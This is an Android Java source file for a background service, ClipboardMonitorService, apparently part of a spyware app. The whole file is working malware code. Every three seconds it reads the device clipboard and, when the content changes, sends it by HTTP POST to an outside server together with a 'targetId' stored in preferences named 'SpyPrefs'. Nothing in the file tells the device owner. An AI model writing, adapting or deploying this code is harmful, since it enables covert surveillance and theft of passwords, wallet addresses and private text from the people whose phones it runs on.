package com.nullx.pp;

import android.app.Service;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class ClipboardMonitorService extends Service {
    private static final String TAG = "CRPT.Clipboard";
    private static final String SERVER_URL = "http://papa.queen-official.com:2949/api/post-response/";
    private ClipboardManager clipboardManager;
    private String lastClipboard = "";
    private android.os.Handler handler = new android.os.Handler();
    private Runnable monitorRunnable;
    
    @Override
    public void onCreate() {
        super.onCreate();
        clipboardManager = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
        startMonitoring();
    }
    
    private void startMonitoring() {
        monitorRunnable = new Runnable() {
            @Override
            public void run() {
                if (clipboardManager.hasPrimaryClip()) {
                    String current = clipboardManager.getPrimaryClip().getItemAt(0).getText().toString();
                    if (!current.equals(lastClipboard)) {
                        lastClipboard = current;
                        sendClipboardToServer(current);
                    }
                }
                handler.postDelayed(this, 3000);
            }
        };
        handler.post(monitorRunnable);
    }
    
    private void sendClipboardToServer(String content) {
        new Thread(() -> {
            try {
                String targetId = getSharedPreferences("SpyPrefs", MODE_PRIVATE).getString("targetId", "unknown");
                URL url = new URL(SERVER_URL + targetId);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                
                JSONObject payload = new JSONObject();
                payload.put("cmd", "clipboard_data");
                payload.put("data", content);
                
                try (OutputStream os = conn.getOutputStream()) {
                    os.write(payload.toString().getBytes());
                }
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Error sending clipboard: " + e.getMessage());
            }
        }).start();
    }
    
    @Override
    public void onDestroy() {
        handler.removeCallbacks(monitorRunnable);
        super.onDestroy();
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}